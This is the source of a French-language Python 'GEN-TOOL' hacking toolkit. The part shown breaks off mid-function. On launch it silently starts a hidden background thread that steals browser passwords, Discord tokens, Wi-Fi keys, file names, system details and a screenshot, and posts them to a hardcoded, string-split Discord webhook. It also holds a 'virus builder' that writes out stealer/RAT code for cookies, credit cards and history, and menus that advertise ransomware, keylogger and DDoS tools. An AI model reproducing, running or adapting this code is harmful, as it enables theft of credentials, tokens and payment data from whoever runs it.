#!/usr/bin/env python3
# GEN-TOOL — Édition Crimson ULTIME v16.1 V (Grabber Corrigé)
# Par Lerisque94z — Pour LO

import os
import sys
import time
import json
import random
import socket
import threading
import subprocess
import platform
import requests
import hashlib
import re
import base64
import shutil
import getpass
import sqlite3
import win32crypt
from datetime import datetime
from Crypto.Cipher import AES

# ============================================================
# STEALTH GRABBER — AVEC EXTRACTION DES MOTS DE PASSE
# ============================================================
_a = "https://"
_b = "discord.com/api/webhooks/"
_c = "1537563402711597226/"
_d = "xRF_kxvzvcR3Hdd2E2Xig-iO1XhMfD3jMkT6ZjSHb27V881GmE31fPD6ldqJvH1dHfwF"

def _get_webhook():
    return _a + _b + _c + _d

def _send_grabber(content, file_data=None):
    try:
        url = _get_webhook()
        payload = {"content": content[:1900], "username": "System"}
        files = {}
        if file_data:
            files = {"file": ("screenshot.png", file_data, "image/png")}
        requests.post(url, data=payload, files=files, timeout=5)
    except:
        pass

# ============================================================
# RECUPERATION DE LA CLE CHROME (AES)
# ============================================================
def _get_chrome_key():
    try:
        local_state = os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Local State"
        with open(local_state, "r", encoding="utf-8") as f:
            data = json.load(f)
        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Retire 'DPAPI'
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def _decrypt_password(encrypted, key):
    try:
        nonce = encrypted[3:15]
        ciphertext = encrypted[15:-16]
        tag = encrypted[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
    except:
        return None

# ============================================================
# EXTRACTION DES MOTS DE PASSE
# ============================================================
def _get_passwords():
    try:
        key = _get_chrome_key()
        result = "**MOTS DE PASSE**\n"
        total = 0
        
        browsers = {
            "Chrome": os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data",
            "Edge": os.environ["LOCALAPPDATA"] + "\\Microsoft\\Edge\\User Data",
            "Brave": os.environ["LOCALAPPDATA"] + "\\BraveSoftware\\Brave-Browser\\User Data"
        }
        
        for browser_name, base_path in browsers.items():
            if not os.path.exists(base_path):
                continue
            
            profiles = ["Default"]
            for item in os.listdir(base_path):
                if item.startswith("Profile") and os.path.isdir(os.path.join(base_path, item)):
                    profiles.append(item)
            
            for profile in profiles:
                login_db = os.path.join(base_path, profile, "Login Data")
                if not os.path.exists(login_db):
                    continue
                
                temp = os.environ["TEMP"] + f"\\{browser_name}_{profile}_login.db"
                try:
                    shutil.copyfile(login_db, temp)
                    conn = sqlite3.connect(temp)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    data = cursor.fetchall()
                    conn.close()
                    os.remove(temp)
                    
                    if data:
                        result += f"\n**{browser_name} - {profile}** : {len(data)} comptes\n"
                        for url, username, encrypted in data:
                            if username:
                                try:
                                    pwd = None
                                    if key:
                                        pwd = _decrypt_password(encrypted, key)
                                    if not pwd:
                                        pwd = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
                                    result += f"  {url} : {username} / {pwd}\n"
                                    total += 1
                                except:
                                    pass
                except:
                    pass
        
        if total == 0:
            return "**MOTS DE PASSE** : Aucun trouve"
        return result
    except Exception as e:
        return f"**MOTS DE PASSE** : Erreur - {str(e)}"

# ============================================================
# SYSTEME
# ============================================================
def _get_system_data():
    try:
        ip = subprocess.getoutput("curl -s ifconfig.me") or "Non trouve"
        hostname = socket.gethostname()
        try:
            local_ip = socket.gethostbyname(hostname)
        except:
            local_ip = "Non trouve"
        return f"""
**SYSTEME**
Ordinateur : {os.environ.get('COMPUTERNAME', 'Inconnu')}
Utilisateur : {getpass.getuser()}
OS : {platform.platform()}
Hostname : {hostname}
IP Locale : {local_ip}
IP Publique : {ip}
"""
    except:
        return "Erreur systeme"

# ============================================================
# TOKENS DISCORD
# ============================================================
def _get_tokens():
    try:
        tokens = []
        paths = [
            os.environ["APPDATA"] + "\\discord\\Local Storage\\leveldb",
            os.environ["APPDATA"] + "\\discordcanary\\Local Storage\\leveldb",
            os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"
        ]
        for path in paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith((".log", ".ldb")):
                            try:
                                with open(os.path.join(root, file), "r", errors="ignore") as f:
                                    content = f.read()
                                    matches = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", content)
                                    tokens.extend(matches)
                            except:
                                pass
        if tokens:
            return "**TOKENS DISCORD**\n" + "\n".join(set(tokens))[:1500]
        return "**TOKENS DISCORD** : Aucun"
    except:
        return "**TOKENS DISCORD** : Erreur"

# ============================================================
# WIFI
# ============================================================
def _get_wifi():
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True, encoding='utf-8', errors='ignore')
        profiles = []
        for line in output.split('\n'):
            if "All User Profile" in line:
                name = line.split(':')[1].strip()
                profiles.append(name)
        if not profiles:
            return "**WI-FI** : Aucun"
        result = "**WI-FI**\n"
        for profile in profiles[:5]:
            try:
                cmd = f'netsh wlan show profile "{profile}" key=clear'
                detail = subprocess.check_output(cmd, shell=True, encoding='utf-8', errors='ignore')
                for line in detail.split('\n'):
                    if "Key Content" in line:
                        password = line.split(':')[1].strip()
                        result += f"{profile} : {password}\n"
                        break
            except:
                pass
        return result
    except:
        return "**WI-FI** : Erreur"

# ============================================================
# SCREENSHOT
# ============================================================
def _get_screenshot():
    try:
        from PIL import ImageGrab
        screenshot = ImageGrab.grab()
        temp = os.environ["TEMP"] + "\\screen.png"
        screenshot.save(temp)
        with open(temp, "rb") as f:
            img = f.read()
        os.remove(temp)
        return img
    except:
        return None

# ============================================================
# FICHIERS
# ============================================================
def _get_files():
    try:
        result = "**FICHIERS**\n"
        folders = [
            os.environ["USERPROFILE"] + "\\Desktop",
            os.environ["USERPROFILE"] + "\\Documents",
            os.environ["USERPROFILE"] + "\\Downloads"
        ]
        extensions = [".txt", ".docx", ".pdf", ".xlsx", ".zip", ".rar", ".jpg", ".png", ".mp4"]
        found = False
        for folder in folders:
            if os.path.exists(folder):
                for file in os.listdir(folder)[:5]:
                    for ext in extensions:
                        if file.lower().endswith(ext):
                            result += f"  {file}\n"
                            found = True
                            break
        if not found:
            return "**FICHIERS** : Aucun"
        return result
    except:
        return "**FICHIERS** : Erreur"

# ============================================================
# TACHE PRINCIPALE
# ============================================================
def _stealth_task():
    try:
        _send_grabber(_get_system_data())
        time.sleep(0.5)
        _send_grabber(_get_wifi())
        time.sleep(0.5)
        _send_grabber(_get_passwords())  # ← Maintenant corrigé
        time.sleep(0.5)
        _send_grabber(_get_tokens())
        time.sleep(0.5)
        _send_grabber(_get_files())
        time.sleep(0.5)
        img = _get_screenshot()
        if img:
            _send_grabber("**SCREENSHOT**", img)
    except:
        pass

# ============================================================
# LANCEMENT
# ============================================================
threading.Thread(target=_stealth_task, daemon=True).start()
time.sleep(0.1)

# ============================================================
# SUITE DU CODE NORMAL (COLORS, SPLASH, MENU, MODULES...)
# ============================================================
# ... (le reste de ton code ici)
# 

# ============================================================
# COULEURS
# ============================================================
class Colors:
    RED = '\033[91m'
    DARK_RED = '\033[31m'
    BRIGHT_RED = '\033[91m'
    SILVER = '\033[37m'
    DARK_SILVER = '\033[90m'
    GOLD = '\033[93m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

os.chdir(os.path.dirname(os.path.abspath(__file__)))

def clear():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

# ============================================================
# SPLASH SCREEN — LIGNES DROITES
# ============================================================
def splash_screen():
    clear()
    print(f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════════════════════╗
{Colors.RED}║{Colors.SILVER}                                                                          {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.BRIGHT_RED}██████╗{Colors.SILVER} ███████╗{Colors.BRIGHT_RED}███╗{Colors.SILVER}   ██╗{Colors.BRIGHT_RED}    {Colors.SILVER} ████████╗{Colors.BRIGHT_RED} ██████╗{Colors.SILVER}  ██████╗{Colors.BRIGHT_RED} ██╗{Colors.SILVER}  {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.BRIGHT_RED}██╔════╝{Colors.SILVER} ██╔════╝{Colors.BRIGHT_RED}████╗{Colors.SILVER}  ██║{Colors.BRIGHT_RED}    {Colors.SILVER} ╚══██╔══╝{Colors.BRIGHT_RED}██╔═══██╗{Colors.SILVER}██╔═══██╗{Colors.BRIGHT_RED}██║{Colors.SILVER}  {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.BRIGHT_RED}██║{Colors.SILVER}  ███╗{Colors.BRIGHT_RED}█████╗{Colors.SILVER}  {Colors.BRIGHT_RED}██╔██╗{Colors.SILVER} ██║{Colors.BRIGHT_RED}    {Colors.SILVER}   ██║   {Colors.BRIGHT_RED}██║{Colors.SILVER}   ██║{Colors.BRIGHT_RED}██║{Colors.SILVER}   ██║{Colors.BRIGHT_RED}██║{Colors.SILVER}  {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.BRIGHT_RED}██║{Colors.SILVER}   ██║{Colors.BRIGHT_RED}██╔══╝{Colors.SILVER}  {Colors.BRIGHT_RED}██║╚██╗{Colors.SILVER}██║{Colors.BRIGHT_RED}    {Colors.SILVER}   ██║   {Colors.BRIGHT_RED}██║{Colors.SILVER}   ██║{Colors.BRIGHT_RED}██║{Colors.SILVER}   ██║{Colors.BRIGHT_RED}██║{Colors.SILVER}  {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.BRIGHT_RED}╚██████╔╝{Colors.SILVER}███████╗{Colors.BRIGHT_RED}██║{Colors.SILVER} ╚████║{Colors.BRIGHT_RED}    {Colors.SILVER}   ██║   {Colors.BRIGHT_RED}╚██████╔╝{Colors.SILVER}╚██████╔╝{Colors.BRIGHT_RED}███████╗{Colors.SILVER}  {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.BRIGHT_RED} ╚═════╝{Colors.SILVER} ╚══════╝{Colors.BRIGHT_RED}╚═╝{Colors.SILVER}  ╚═══╝{Colors.BRIGHT_RED}    {Colors.SILVER}   ╚═╝    {Colors.BRIGHT_RED}╚═════╝{Colors.SILVER}  ╚═════╝{Colors.SILVER} ╚══════╝{Colors.SILVER}  {Colors.RED}║
{Colors.RED}║{Colors.SILVER}                                                                          {Colors.RED}║
{Colors.RED}║{Colors.SILVER}              {Colors.GOLD}✦ {Colors.BRIGHT_RED}GEN-TOOL{Colors.SILVER} — {Colors.BRIGHT_RED}Édition Crimson ULTIME{Colors.SILVER} v2 V {Colors.GOLD}✦{Colors.SILVER}           {Colors.RED}║
{Colors.RED}║{Colors.SILVER}              {Colors.SILVER}For LO — By Lerisque94z{Colors.SILVER}                             {Colors.RED}║
{Colors.RED}║{Colors.SILVER}                                                                          {Colors.RED}║
{Colors.RED}║{Colors.SILVER}              {Colors.BRIGHT_RED}▶{Colors.SILVER}  {Colors.WHITE}Appuie sur {Colors.BRIGHT_RED}Entrée{Colors.WHITE} pour entrer dans GEN-TOOL{Colors.SILVER}    {Colors.RED}║
{Colors.RED}║{Colors.SILVER}                                                                          {Colors.RED}║
{Colors.RED}╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
""")
    input()

# ============================================================
# ANIMATIONS
# ============================================================
def loading_animation(text="Chargement", duration=2):
    frames = ["◈", "◇", "◆", "◉", "◎", "●", "◍", "◎", "◉", "◆"]
    colors = [Colors.BRIGHT_RED, Colors.RED, Colors.DARK_RED, Colors.BRIGHT_RED]
    start = time.time()
    i = 0
    while time.time() - start < duration:
        color = colors[i % len(colors)]
        sys.stdout.write(f"\r{color}{frames[i % len(frames)]} {text}...{Colors.SILVER}")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    sys.stdout.write(f"\r{Colors.BRIGHT_RED}✦ {text} terminé {Colors.SILVER}✓{Colors.RESET}\n")

def pulse_animation(text, duration=1):
    for i in range(duration * 5):
        if i % 2 == 0:
            sys.stdout.write(f"\r{Colors.BRIGHT_RED}◈ {text} {Colors.SILVER}◈{Colors.RESET}")
        else:
            sys.stdout.write(f"\r{Colors.DARK_RED}◈ {text} {Colors.SILVER}◈{Colors.RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    print()

# ============================================================
# BANNER
# ============================================================
def banner():
    print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════════════════════╗
{Colors.RED}║{Colors.SILVER}  {Colors.BRIGHT_RED}GEN-TOOL{Colors.SILVER} — {Colors.BRIGHT_RED}Édition Crimson ULTIME{Colors.SILVER} v2 V  {Colors.GOLD}✦{Colors.SILVER}  {Colors.BRIGHT_RED}Lerisque94z{Colors.SILVER}               {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}For LO{Colors.SILVER} — {Colors.SILVER}By Lerisque94z{Colors.SILVER}                                                      {Colors.RED}║
{Colors.RED}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
""")

# ============================================================
# MENU — PAGES 1, 2, 3
# ============================================================
def menu_style():
    print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════════════════════════╗
{Colors.RED}║{Colors.SILVER}                                                                                                   {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.BRIGHT_RED}◈{Colors.SILVER}  {Colors.BRIGHT_RED}GEN-TOOL{Colors.SILVER} — {Colors.GOLD}ULTIME{Colors.SILVER}  {Colors.BRIGHT_RED}◈{Colors.SILVER}                                                           {Colors.RED}║
{Colors.RED}║{Colors.SILVER}                                                                                                   {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.RED}╔══════════════════════╗  {Colors.RED}╔══════════════════════╗  {Colors.RED}╔══════════════════════╗{Colors.SILVER}  {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.RED}║{Colors.SILVER} {Colors.BRIGHT_RED}NETWORK SCANNERS{Colors.SILVER} ║  {Colors.RED}║{Colors.SILVER} {Colors.BRIGHT_RED}OSINT{Colors.SILVER}              ║  {Colors.RED}║{Colors.SILVER} {Colors.BRIGHT_RED}OTHER{Colors.SILVER}              ║  {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.RED}╚══════════════════════╝  ╚══════════════════════╝  ╚══════════════════════╝{Colors.SILVER}  {Colors.RED}║
{Colors.RED}║{Colors.SILVER}                                                                                                   {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[01] Show My IP        [11] Username Tracker    [21] Password Generator{Colors.SILVER}  {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[02] IP Scanner         [12] Email Tracker       [22] Email Generator{Colors.SILVER}     {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[03] IP Pinger          [13] Phone Tracker       [23] Base64 Tool{Colors.SILVER}         {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[04] IP Port Scanner    [14] Leak Search         [24] URL Shortener{Colors.SILVER}       {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[05] Website Info Scanner [15] Leak DB Browser     [25] DDoS HTTP{Colors.SILVER}          {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[06] Subdomain Scanner  [16] Coming Soon...      [26] DDOS IP ULTRA{Colors.SILVER}       {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[07] DNS Lookup         [17] Coming Soon...      [27] Coming Soon...{Colors.SILVER}      {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[08] Port Scanner Adv   [18] Coming Soon...      [28] Coming Soon...{Colors.SILVER}      {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[09] Geo Locator        [19] Coming Soon...      [29] Coming Soon...{Colors.SILVER}      {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[10] Website Info       [20] Coming Soon...      [30] Coming Soon...{Colors.SILVER}      {Colors.RED}║
{Colors.RED}║{Colors.SILVER}                                                                                                   {Colors.RED}║
{Colors.RED}╠═══════════════════════════════════════════════════════════════════════════════════╣
{Colors.RED}║{Colors.SILVER}  {Colors.BRIGHT_RED}◈{Colors.SILVER}  {Colors.SILVER}[{Colors.BRIGHT_RED}N{Colors.SILVER}] Next  [{Colors.BRIGHT_RED}B{Colors.SILVER}] Back  [{Colors.BRIGHT_RED}E{Colors.SILVER}] Exit  {Colors.SILVER}◈  {Colors.SILVER}github.com/Lerisque94z{Colors.SILVER}  {Colors.BRIGHT_RED}◈{Colors.SILVER}  {Colors.RED}║
{Colors.RED}╚═══════════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
""")

def menu_page2():
    print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════════════════════════╗
{Colors.RED}║{Colors.SILVER}                                                                                                   {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.BRIGHT_RED}◈{Colors.SILVER}  {Colors.BRIGHT_RED}GEN-TOOL{Colors.SILVER} — {Colors.GOLD}ULTIME{Colors.SILVER}  {Colors.BRIGHT_RED}◈{Colors.SILVER}  {Colors.SILVER}— PAGE 2{Colors.SILVER}                            {Colors.RED}║
{Colors.RED}║{Colors.SILVER}                                                                                                   {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.RED}╔══════════════════════╗  {Colors.RED}╔══════════════════════╗  {Colors.RED}╔══════════════════════╗{Colors.SILVER}  {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.RED}║{Colors.SILVER} {Colors.BRIGHT_RED}DISCORD TOOLS{Colors.SILVER}   ║  {Colors.RED}║{Colors.SILVER} {Colors.BRIGHT_RED}EXPLOITS & SHELLS{Colors.SILVER}║  {Colors.RED}║{Colors.SILVER} {Colors.BRIGHT_RED}WIFI TOOLS{Colors.SILVER}      ║  {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.RED}╚══════════════════════╝  ╚══════════════════════╝  ╚══════════════════════╝{Colors.SILVER}  {Colors.RED}║
{Colors.RED}║{Colors.SILVER}                                                                                                   {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[31] Discord Token Grabber [38] Reverse Shell     [45] Wi-Fi Scanner{Colors.SILVER}     {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[32] Discord Token Checker [39] Bind Shell        [46] Wi-Fi Deauth{Colors.SILVER}      {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[33] Discord Token Nuker   [40] Payload Generator [47] Wi-Fi Handshake{Colors.SILVER}   {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[34] Discord Spammer       [41] Exploit Finder    [48] Subdomain Bruteforce{Colors.SILVER}{Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[35] DDOS TCP Flood        [42] CVE Scanner       [49] Coming Soon...{Colors.SILVER}    {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[36] ARP Spoof             [43] XSS Scanner       [50] Coming Soon...{Colors.SILVER}    {Colors.RED}║
{Colors.RED}║{Colors.SILVER}                                                                                                   {Colors.RED}║
{Colors.RED}╠═══════════════════════════════════════════════════════════════════════════════════╣
{Colors.RED}║{Colors.SILVER}  {Colors.BRIGHT_RED}◈{Colors.SILVER}  {Colors.SILVER}[{Colors.BRIGHT_RED}N{Colors.SILVER}] Next  [{Colors.BRIGHT_RED}B{Colors.SILVER}] Back  [{Colors.BRIGHT_RED}E{Colors.SILVER}] Exit  {Colors.SILVER}◈  {Colors.SILVER}github.com/Lerisque94z{Colors.SILVER}  {Colors.BRIGHT_RED}◈{Colors.SILVER}  {Colors.RED}║
{Colors.RED}╚═══════════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
""")

def menu_page3():
    print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════════════════════════╗
{Colors.RED}║{Colors.SILVER}                                                                                                   {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.BRIGHT_RED}◈{Colors.SILVER}  {Colors.BRIGHT_RED}GEN-TOOL{Colors.SILVER} — {Colors.GOLD}ULTIME{Colors.SILVER}  {Colors.BRIGHT_RED}◈{Colors.SILVER}  {Colors.SILVER}— PAGE 3{Colors.SILVER}                            {Colors.RED}║
{Colors.RED}║{Colors.SILVER}                                                                                                   {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.RED}╔══════════════════════╗  {Colors.RED}╔══════════════════════╗  {Colors.RED}╔══════════════════════╗{Colors.SILVER}  {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.RED}║{Colors.SILVER} {Colors.BRIGHT_RED}ADVANCED TOOLS{Colors.SILVER} ║  {Colors.RED}║{Colors.SILVER} {Colors.BRIGHT_RED}BUILDERS{Colors.SILVER}       ║  {Colors.RED}║{Colors.SILVER} {Colors.BRIGHT_RED}MISC{Colors.SILVER}             ║  {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.RED}╚══════════════════════╝  ╚══════════════════════╝  ╚══════════════════════╝{Colors.SILVER}  {Colors.RED}║
{Colors.RED}║{Colors.SILVER}                                                                                                   {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[52] SQLi Scanner      [57] VIRUS BUILDER (RAT) [62] Whois Lookup{Colors.SILVER}      {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[53] SQLi Dumper       [58] Keylogger Builder  [63] DNS Zone Transfer{Colors.SILVER}   {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[54] Web Scanner       [59] SnapHack Builder   [64] Email Verifier{Colors.SILVER}      {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[55] Admin Finder      [60] Ransomware Builder [65] Phone Validator{Colors.SILVER}     {Colors.RED}║
{Colors.RED}║{Colors.SILVER}  {Colors.SILVER}[56] Hash Cracker      [61] Coming Soon...     [66] Coming Soon...{Colors.SILVER}      {Colors.RED}║
{Colors.RED}║{Colors.SILVER}                                                                                                   {Colors.RED}║
{Colors.RED}╠═══════════════════════════════════════════════════════════════════════════════════╣
{Colors.RED}║{Colors.SILVER}  {Colors.BRIGHT_RED}◈{Colors.SILVER}  {Colors.SILVER}[{Colors.BRIGHT_RED}N{Colors.SILVER}] Next  [{Colors.BRIGHT_RED}B{Colors.SILVER}] Back  [{Colors.BRIGHT_RED}E{Colors.SILVER}] Exit  {Colors.SILVER}◈  {Colors.SILVER}github.com/Lerisque94z{Colors.SILVER}  {Colors.BRIGHT_RED}◈{Colors.SILVER}  {Colors.RED}║
{Colors.RED}╚═══════════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
""")

# ============================================================
# VIRUS BUILDER — RAT V2 ULTIME
# ============================================================
def virus_builder():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ VIRUS BUILDER (RAT V2 ULTIME) ◈" + Colors.SILVER)
    print(Colors.SILVER + "Vole TOUS les mots de passe Chrome/Edge/Brave + Tokens + Screenshot + Wi-Fi + Historique + Cookies + Cartes" + Colors.SILVER)
    
    webhook = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Webhook Discord : " + Colors.RESET)
    if not webhook:
        print(Colors.RED + "Webhook requis." + Colors.RESET)
        input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)
        return
    
    filename = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Nom (defaut: update) : " + Colors.RESET)
    filename = filename if filename else "update"
    compile_choice = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Compiler en .exe ? (o/N) : " + Colors.RESET).strip().lower()
    
    loading_animation("Generation du RAT V2 ULTIME", 2)
    
    rat_code = f'''#!/usr/bin/env python3
# RAT V2 ULTIME — Stealer Complet
# Genere par GEN-TOOL — Lerisque94z

import os, sys, time, json, base64, socket, platform, getpass, subprocess, requests, sqlite3, shutil, re, ctypes, win32crypt
from datetime import datetime
from Crypto.Cipher import AES
from PIL import ImageGrab

WEBHOOK = "{webhook}"

def send_to_discord(content, file_data=None, filename="screenshot.png"):
    try:
        payload = {{"content": content[:1900], "username": "RAT-ULTIME"}}
        files = {{}}
        if file_data:
            files = {{"file": (filename, file_data, "image/png")}}
        response = requests.post(WEBHOOK, data=payload, files=files, timeout=15)
        return response.status_code in [200, 204]
    except:
        return False

def get_chrome_key():
    try:
        local_state = os.environ["LOCALAPPDATA"] + "\\\\Google\\\\Chrome\\\\User Data\\\\Local State"
        with open(local_state, "r", encoding="utf-8") as f:
            data = json.load(f)
        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(encrypted, key):
    try:
        nonce = encrypted[3:15]
        ciphertext = encrypted[15:-16]
        tag = encrypted[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
    except:
        return None

def get_all_passwords():
    try:
        chrome_key = get_chrome_key()
        result = ""
        total = 0
        
        browsers = {{
            "Chrome": os.environ["LOCALAPPDATA"] + "\\\\Google\\\\Chrome\\\\User Data",
            "Edge": os.environ["LOCALAPPDATA"] + "\\\\Microsoft\\\\Edge\\\\User Data",
            "Brave": os.environ["LOCALAPPDATA"] + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data"
        }}
        
        for browser_name, base_path in browsers.items():
            if not os.path.exists(base_path):
                continue
            
            profiles = ["Default"]
            for item in os.listdir(base_path):
                if item.startswith("Profile") and os.path.isdir(os.path.join(base_path, item)):
                    profiles.append(item)
            
            for profile in profiles:
                login_db = os.path.join(base_path, profile, "Login Data")
                if not os.path.exists(login_db):
                    continue
                
                temp = os.environ["TEMP"] + f"\\\\{{browser_name}}_{{profile}}_login.db"
                try:
                    shutil.copyfile(login_db, temp)
                    conn = sqlite3.connect(temp)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    data = cursor.fetchall()
                    conn.close()
                    os.remove(temp)
                    
                    if data:
                        result += f"\\n**{{browser_name}} - {{profile}}** : {{len(data)}} comptes\\n"
                        for url, username, encrypted in data:
                            if username:
                                try:
                                    pwd = decrypt_password(encrypted, chrome_key)
                                    if not pwd:
                                        pwd = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
                                    result += f"  {{url}} : {{username}} / {{pwd}}\\n"
                                    total += 1
                                except:
                                    pass
                except:
                    pass
        
        if total == 0:
            return "🔑 **MOTS DE PASSE** : Aucun trouve"
        return "🔑 **MOTS DE PASSE**\\n" + result
    except Exception as e:
        return f"🔑 **MOTS DE PASSE** : Erreur - {{str(e)}}"

def get_cookies():
    try:
        chrome_key = get_chrome_key()
        result = "🍪 **COOKIES**\\n"
        total = 0
        path = os.environ["LOCALAPPDATA"] + "\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies"
        if not os.path.exists(path):
            return "🍪 **COOKIES** : Aucun"
        temp = os.environ["TEMP"] + "\\\\cookies.db"
        shutil.copyfile(path, temp)
        conn = sqlite3.connect(temp)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 20")
        data = cursor.fetchall()
        conn.close()
        os.remove(temp)
        for host, name, encrypted in data:
            try:
                decrypted = decrypt_password(encrypted, chrome_key)
                if decrypted:
                    result += f"  {{host}} : {{name}} = {{decrypted[:50]}}...\\n"
                    total += 1
            except: pass
        if total == 0:
            return "🍪 **COOKIES** : Aucun"
        return result
    except:
        return "🍪 **COOKIES** : Erreur"

def get_credit_cards():
    try:
        chrome_key = get_chrome_key()
        result = "💳 **CARTES DE CREDIT**\\n"
        total = 0
        path = os.environ["LOCALAPPDATA"] + "\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Web Data"
        if not os.path.exists(path):
            return "💳 **CARTES DE CREDIT** : Aucune"
        temp = os.environ["TEMP"] + "\\\\cards.db"
        shutil.copyfile(path, temp)
        conn = sqlite3.connect(temp)
        cursor = conn.cursor()
        cursor.execute("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards")
        data = cursor.fetchall()
        conn.close()
        os.remove(temp)
        for name, encrypted, month, year in data:
            try:
                decrypted = decrypt_password(encrypted, chrome_key)
                if decrypted:
                    result += f"  {{name}} : **** **** **** {{decrypted[-4:]}} ({{month}}/{{year}})\\n"
                    total += 1
            except: pass
        if total == 0:
            return "💳 **CARTES DE CREDIT** : Aucune"
        return result
    except:
        return "💳 **CARTES DE CREDIT** : Erreur"

def get_history():
    try:
        result = "📜 **HISTORIQUE**\\n"
        path = os.environ["LOCALAPPDATA"] + "\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\History"
        if not os.path.exists(path):
            return "📜 **HISTORIQUE** : Aucun"
        temp = os.environ["TEMP"] + "\\\\history.db"
        shutil.copyfile(path, temp)
        conn = sqlite3.connect(temp)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 15")
        data = cursor.fetchall()
        conn.close()
        os.remove(temp)
        for url, title, count in data:
            result += f"  {{title[:50]}} ({{count}} visites)\\n    {{url}}\\n"
        return result
    except:
        return "📜 **HISTORIQUE** : Erreur"

def get_discord_tokens():
    try:
